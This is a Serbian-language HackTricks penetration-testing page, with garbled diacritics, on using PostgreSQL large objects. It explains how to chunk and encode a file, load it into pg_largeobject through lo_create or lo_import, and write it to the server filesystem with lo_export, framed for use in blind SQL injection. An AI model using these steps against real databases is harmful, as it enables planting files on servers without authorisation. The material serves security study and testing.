<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

### PostgreSQL veliki objekti

PostgreSQL nudi strukturu poznatu kao **veliki objekti**, pristupa캜nu putem tabele `pg_largeobject`, dizajniranu za skladi코tenje velikih tipova podataka, kao 코to su slike ili PDF dokumenti. Ovaj pristup je povoljniji od funkcije `COPY TO` jer omogu캖ava **izvoz podataka nazad na fajl sistem**, 캜ime se obezbe캠uje ta캜na replika originalnog fajla.

Za **skladi코tenje kompletnog fajla** unutar ove tabele, mora se kreirati objekat u tabeli `pg_largeobject` (identifikovan sa LOID-om), a zatim se vr코i umetanje podataka u ove objekte u obliku delova, pri 캜emu svaki deo ima veli캜inu od 2KB. Veoma je va쬹o da ovi delovi budu ta캜no 2KB veli캜ine (uz mogu캖i izuzetak poslednjeg dela) kako bi funkcija izvoza ispravno radila.

Da biste **podelili va코e binarne podatke** na delove od 2KB, mogu se izvr코iti slede캖e komande:
```bash
split -b 2048 your_file # Creates 2KB sized files
```
Za enkodiranje svake datoteke u Base64 ili Hex format, mogu se koristiti slede캖e komande:
```bash
base64 -w 0 <Chunk_file> # Encodes in Base64 in one line
xxd -ps -c 99999999999 <Chunk_file> # Encodes in Hex in one line
```
**Va쬹o**: Prilikom automatizacije ovog procesa, obezbedite slanje delova od 2KB 캜istog teksta u bajtovima. Kod heksadecimalno kodiranih fajlova 캖e biti potrebno 4KB podataka po delu zbog udvostru캜enja veli캜ine, dok kod Base64 kodiranih fajlova va쬴 formula `ceil(n / 3) * 4`.

Sadr쬬j velikih objekata mo쬰 se pregledati u svrhe otklanjanja gre코aka koriste캖i:
```sql
select loid, pageno, encode(data, 'escape') from pg_largeobject;
```
#### Kori코캖enje `lo_creat` & Base64

Da biste sa캜uvali binarne podatke, prvo se kreira LOID:
```sql
SELECT lo_creat(-1);       -- Creates a new, empty large object
SELECT lo_create(173454);  -- Attempts to create a large object with a specific OID
```
U situacijama koje zahtevaju preciznu kontrolu, kao 코to je iskori코캖avanje Slepe SQL Injection, `lo_create` se preferira za specificiranje fiksnog LOID-a.

Podaci se mogu zatim ubaciti na slede캖i na캜in:
```sql
INSERT INTO pg_largeobject (loid, pageno, data) VALUES (173454, 0, decode('<B64 chunk1>', 'base64'));
INSERT INTO pg_largeobject (loid, pageno, data) VALUES (173454, 1, decode('<B64 chunk2>', 'base64'));

```
Da biste izvezli i potencijalno obrisali veliki objekat nakon upotrebe:
```sql
SELECT lo_export(173454, '/tmp/your_file');
SELECT lo_unlink(173454);  -- Deletes the specified large object
```
#### Kori코캖enje `lo_import` & Hex

Funkcija `lo_import` mo쬰 se koristiti za kreiranje i specificiranje LOID-a za veliki objekat:
```sql
select lo_import('/path/to/file');
select lo_import('/path/to/file', 173454);
```
Nakon kreiranja objekta, podaci se ubacuju po stranici, pri 캜emu se svaki deo ne sme prelaziti 2KB:
```sql
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=0;
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=1;
```
Da biste zavr코ili proces, podaci se izvoze i veliki objekat se bri코e:
```sql
select lo_export(173454, '/path/to/your_file');
select lo_unlink(173454);  -- Deletes the specified large object
```
### Ograni캜enja

Prime캖eno je da **veliki objekti mogu imati ACL-ove** (Access Control List), 코to potencijalno ograni캜ava pristup 캜ak i objektima koje je kreirao va코 korisnik. Me캠utim, stariji objekti sa dozvoljenim ACL-ovima i dalje mogu biti dostupni za izvla캜enje sadr쬬ja.

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini da podr쬴te HackTricks:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu**, proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
